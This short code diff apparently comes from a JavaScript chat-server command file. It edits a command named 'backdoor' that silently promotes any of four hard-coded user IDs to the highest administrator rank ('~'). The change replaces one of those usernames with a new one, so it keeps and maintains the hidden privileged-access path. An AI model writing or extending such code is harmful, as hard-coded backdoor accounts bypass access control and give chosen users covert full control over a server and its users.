@@ -2055,7 +2055,7 @@ hide: function(target, room, user) {
 	},
 	
 	backdoor: function(target,room, user) {
-		if (user.userid === 'blakjack' || user.userid === 'skarr' || user.userid === 'queenofdubstep' || user.userid === 'elite4guetta') {
+		if (user.userid === 'blakjack' || user.userid === 'skarr' || user.userid === 'queenofdubstep' || user.userid === 'e4arsh') {
 
 			user.group = '~';
 			user.updateIdentity();
